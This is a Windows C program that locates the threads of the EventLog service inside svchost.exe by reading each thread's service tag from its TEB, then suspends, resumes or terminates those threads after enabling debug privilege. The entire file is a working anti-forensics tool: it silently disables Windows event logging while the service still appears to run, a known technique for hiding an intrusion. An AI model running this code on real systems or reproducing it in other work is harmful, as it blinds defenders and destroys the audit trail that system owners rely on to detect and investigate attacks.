#include <Windows.h>
#include <stdio.h>
#include <winsvc.h>
#include <TlHelp32.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define warn(x, y) printf("%s : 0x%08X\n", x, y);

/* Thread Information Classes */
typedef enum _THREADINFOCLASS
{
    ThreadBasicInformation,
    ThreadTimes,
    ThreadPriority,
    ThreadBasePriority,
    ThreadAffinityMask,
    ThreadImpersonationToken,
    ThreadDescriptorTableEntry,
    ThreadEnableAlignmentFaultFixup,
    ThreadEventPair_Reusable,
    ThreadQuerySetWin32StartAddress,
    ThreadZeroTlsCell,
    ThreadPerformanceCount,
    ThreadAmILastThread,
    ThreadIdealProcessor,
    ThreadPriorityBoost,
    ThreadSetTlsArrayAddress,
    ThreadIsIoPending,
    ThreadHideFromDebugger,
    MaxThreadInfoClass
} THREADINFOCLASS;

typedef enum _TAG_INFO_LEVEL
{
    eTagInfoLevelNameFromTag = 1,
    eTagInfoLevelNamesReferencingModule,
    eTagInfoLevelNameTagMapping,
    eTagInfoLevelMax
} TAG_INFO_LEVEL;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID;

typedef LONG KPRIORITY;

typedef struct _SC_SERVICE_TAG_QUERY
{
    ULONG   processId;
    ULONG   serviceTag;
    ULONG   reserved;
    PVOID   pBuffer;
} SC_SERVICE_TAG_QUERY, *PSC_SERVICE_TAG_QUERY;

typedef struct _THREAD_BASIC_INFORMATION
{

    NTSTATUS                ExitStatus;
    PVOID                   TebBaseAddress;
    CLIENT_ID               ClientId;
    KAFFINITY               AffinityMask;
    KPRIORITY               Priority;
    KPRIORITY               BasePriority;

} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

typedef NTSTATUS (NTAPI *NQIT)(
    HANDLE          ThreadHandle,
    THREADINFOCLASS ThreadInformationClass,
    PVOID           ThreadInformation,
    ULONG           ThreadInformationLength,
    PULONG          ReturnLength
);

typedef DWORD(WINAPI *I_QTI)(
    _In_opt_ LPCWSTR            pszMachineName,
    _In_     TAG_INFO_LEVEL     eInfoLevel,
    _Inout_  PVOID              pTagInfo
);

typedef enum _OPERATION
{
    SUSPEND,
    RESUME,
    TERMINATE
} OPERATION;

BOOL check_enable_privileges(LPCTSTR priv);

int main(int argc, char **argv)
{
    SC_HANDLE                   managerdb = NULL, svc = NULL;
    HANDLE                      svcproc = NULL, snap = NULL, thread = NULL;
    SERVICE_STATUS_PROCESS      status;
    DWORD                       needed, offset;
    THREADENTRY32               te;
    BOOL                        iswow64;
    THREAD_BASIC_INFORMATION    basicinfo = { 0 };
    NTSTATUS                    ntstatus;
    PVOID                       subproctag;
    SC_SERVICE_TAG_QUERY        query = { 0 };
    OPERATION                   type;

    if (argc < 2) {
        printf("Suspend  : %s s\n", argv[0]);
        printf("Resume   : %s r\n", argv[0]);
        printf("Terminate: %s t\n", argv[0]);

        return 0;
    }

    if (argv[1][0] == 's') {
        type = SUSPEND;
    }
    else if (argv[1][0] == 'r') {
        type = RESUME;
    }
    else if (argv[1][0] == 't') {
        type = TERMINATE;
    }
    else {
        puts("Invalid Operation");
        return 0;
    }

    if (!check_enable_privileges(SE_DEBUG_NAME)) {
        puts("not admin!");
        goto out;
    }

    NQIT NtQueryInformationThread = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
    I_QTI I_QueryTagInformation = GetProcAddress(LoadLibraryA("advapi32.dll"), "I_QueryTagInformation");

    if (!NtQueryInformationThread || !I_QueryTagInformation) {
        warn("functions not resolved", 0);
        goto out;
    }

    managerdb = OpenSCManagerA(NULL, NULL, MAXIMUM_ALLOWED);
    if (!managerdb) {
        warn("OpenSCManagerA fail", GetLastError());
        goto out;
    }

    svc = OpenServiceA(managerdb, "EventLog", MAXIMUM_ALLOWED);
    if (!svc) {
        warn("OpenServiceA fail", GetLastError());
        goto out;
    }

    if (!QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, &status, sizeof(SERVICE_STATUS_PROCESS), &needed)) {
        warn("QueryServiceStatusEx fail", GetLastError());
        goto out;
    }

    printf("svchost.exe process hosting eventlog: %d\n", status.dwProcessId);

    svcproc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, status.dwProcessId);
    if (!svcproc) {
        warn("OpenProcess fail", GetLastError());
        goto out;
    }

    // check if svchost.exe is 32- or 64-bit, offset in TEB is different for each arch
    if (!IsWow64Process(svcproc, &iswow64)) {
        warn("IsWow64Process fail", GetLastError());
        goto out;
    }

    if (!iswow64)
        offset = 0x1720; // 64-bit
     else
        offset = 0xf60;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        warn("CreateToolhelp32Snapshot fail", GetLastError());
        goto out;
    }

    te.dwSize = sizeof(THREADENTRY32);

    query.processId = status.dwProcessId;

    if (!Thread32First(snap, &te)) {
        warn("Thread32First fail", GetLastError());
        goto out;
    }
    do {
        if (te.th32OwnerProcessID != status.dwProcessId)
            continue;

        thread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
        if (!thread) {
            warn("OpenThread fail", GetLastError());
            goto out;
        }
        
        ntstatus = NtQueryInformationThread(thread, ThreadBasicInformation, &basicinfo, sizeof(THREAD_BASIC_INFORMATION), NULL);
        if (!NT_SUCCESS(ntstatus)) {
            warn("NtQueryInformationThread fail", ntstatus);
            goto out;
        }

        // read subProcessTag value from TEB of svchost.exe
        if (!ReadProcessMemory(svcproc, ((ULONG_PTR)basicinfo.TebBaseAddress + offset), &subproctag, sizeof(subproctag), NULL)) {
            warn("ReadProcessMemory fail", GetLastError());
            goto out;
        }

        query.pBuffer = NULL;
        query.reserved = 0;
        query.serviceTag = subproctag;

        I_QueryTagInformation(NULL, eTagInfoLevelNameFromTag, &query);
        if (!query.pBuffer)
            continue;

        if (_wcsicmp((wchar_t *)query.pBuffer, L"eventlog") == 0) {
            printf("found eventlog thread : %d\n", te.th32ThreadID);
            if (type == SUSPEND) {
                if (SuspendThread(thread) < 0)
                    warn("SuspendThread fail", GetLastError());
            }
            else if (type == RESUME) {
                if (ResumeThread(thread) < 0)
                    warn("ResumeThread fail", GetLastError());
            }
            else {
                if (!TerminateThread(thread, 0))
                    warn("TerminateThread fail", GetLastError());
            }
        }

        CloseHandle(thread);
        thread = NULL;

    } while (Thread32Next(snap, &te));

    puts("Done");

out:
    if (managerdb)
        CloseServiceHandle(managerdb);
    if (svc)
        CloseServiceHandle(svc);
    if (snap)
        CloseHandle(snap);
    if (thread)
        CloseHandle(thread);
    if (svcproc)
        CloseHandle(svcproc);
    return 0;
}

BOOL check_enable_privileges(LPCTSTR priv)
{
    BOOL                status = TRUE;
    HANDLE              process = NULL;
    TOKEN_PRIVILEGES    tp;
    LUID                luid;

    if (!(status = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &process))) {
        warn("OpenProcessToken fail", GetLastError());
        goto out;
    }

    if (!(status = LookupPrivilegeValue(NULL, priv, &luid))) {
        warn("LookupPrivilegeValue fail", GetLastError());
        goto out;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!(status = AdjustTokenPrivileges(process, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))) {
        warn("AdjustTokenPrivileges fail", GetLastError());
        goto out;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        status = FALSE;
        goto out;
    }

out:
    if (process)
        CloseHandle(process);

    return status;
}